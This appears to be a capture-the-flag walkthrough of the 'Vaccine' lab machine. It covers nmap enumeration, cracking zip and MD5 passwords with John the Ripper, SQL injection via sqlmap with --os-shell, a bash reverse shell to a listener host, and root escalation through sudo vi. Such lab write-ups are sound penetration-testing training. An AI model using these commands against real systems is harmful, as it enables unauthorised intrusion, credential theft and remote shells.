# Vaccine

## Information gathering

### Nmap
```bash
# Nmap 7.91 scan initiated Fri Aug 27 14:55:12 2021 as: nmap -T4 -p 21,22,80 -sC -sV -oA nmap/scan 10.10.10.46
Nmap scan report for 10.10.10.46 (10.10.10.46)
Host is up (0.30s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: MegaCorp Login
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Aug 27 14:55:32 2021 -- 1 IP address (1 host up) scanned in 20.25 seconds
```

### Enumeration

1. Login to ftp with credentials from previous box `ftpuser:mc@F1l3ZilL4`
2. Download backup.zip file
3. Crack the password with johntheripper:
	- zip2john backup.zip > hash.txt
	- john --wordlist=/usr/share/wordlists/rockyou.txt
	- Pass: 741852963

4. index.php file shows user: admin and md5:2cb42f8734ea607eefed3b70af13bbd3

	- `john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt md5.txt`
	- Pass:qwerty789
5. Login to site and see that the search field could be vulnerable to SQLi
6. run `sqlmap -u http://10.10.10.46/dashboard.php?search=Elixir --cookie="PHPSESSID=k34ags0ti3lofrj01amq5me2f5"`

### Exploitation

8. Then discover that we can pass `--os-shell` to the command above: `sqlmap -u http://10.10.10.46/dashboard.php?search=Elixir --cookie="PHPSESSID=k34ags0ti3lofrj01amq5me2f5" --os-shell`
9. Start nc listener `nc -lvnp 1234` 
10. Start a reverse bash shell `bash -c 'bash -i >& /dev/tcp/10.10.14.117/1234 0>&1'`
11. Spawn a tty shell: `SHELL=/bin/bash script -q /dev/null`
12. Go through dashboard.php file and discover pass: P@s5w0rd!
13. Run `sudo -l`
14. Discover `/bin/vi /etc/postgresql/11/main/pg_hba.conf` can be run as root
15. Run `:shell`
16. We are root, `more /root/root.txt`




